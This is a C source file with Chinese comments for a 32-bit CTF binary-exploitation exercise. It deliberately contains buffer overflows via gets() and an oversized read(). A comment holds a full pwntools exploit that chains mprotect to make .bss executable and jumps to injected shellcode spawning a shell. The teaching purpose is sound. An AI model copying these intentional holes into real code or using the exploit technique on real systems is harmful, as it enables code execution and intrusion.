// gcc -fno-stack-protector -no-pie -m32 shellcd2r.c -o shellcd2r

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h> //mprotect函数头文件

char a[50];  //未初始化的全局变量保存在elf文件的.bss段

//当ctf题中的.bss段没有执行权限时，可以在exp调用mprotect函数开权限
void key()
{
    int *addr=0;        //1.这里mprotect函数并没有提权作用
    mprotect(addr,0,0); //2.只有代码里提供了mprotect函数在exp的中才能拿到mprotect地址
}


void W_E_cd()
{
    int b[1];
    setvbuf(stdout,0,_IONBF,0);
    puts("Your shellcode:\n");
    read(0,&a,100);        //写入shellcode到数组a
    puts("Execute shellcode:\n");
    gets(b);               //覆盖返回地址为shellcode的地址，达到执行shellcode的目的
}

int main()
{
    //	int *addr=0x0804c000;
    //	mprotect(addr,0x1000,7); //如果源代码里已经提权，就不用我们人工调用mprotect了
    W_E_cd();
    return 0;
}

/*
mprotect(<要提权段的起始地址>，<要提权段的长度（以0x1000为单位）>，<权限说明>)；7代表最高权限rwx（读写执行：r-1；w-2；x-4）；mmap也可以提权。
mprotect、mmap函数详解看这里 https://blog.csdn.net/qq_45595732/article/details/115166820

from pwn import *
p = process('./shellcd2r')
elf = ELF('./shellcd2r')

bss_addr = 0x804c000  #注意这里的.bss地址不为ida里面看的，要看上面vmmap里的.bss所在范围
shellcd_addr = 0x804C060
pop_3_ret = 0x8049351    #pop esi; pop edi; pop ebp; ret

pload = 'A'*16

#返回地址给mprotect覆盖
pload += p32(elf.symbols['mprotect'])    #获取mprotect函数的实际地址
pload += p32(pop_3_ret)                  #将以下三个数据作为mprotect函数参数先pop到寄存器

#依次pop三个参数，这里不怎么理解的可以看看pop的功能
pload += p32(bss_addr)
pload += p32(0x1000)
pload += p32(0x7)

#pop_3_ret的最后一个指令ret会使返回到shellcd_addr
pload += p32(shellcd_addr)

#gdb.attach(p)
p.recv()
p.sendline(asm(shellcraft.sh())) #先发送shellcode给read函数接收
p.recv()
p.send(pload)                    #进行覆盖，先给.bss提权，然后调用shellcode地址
p.interactive()
 */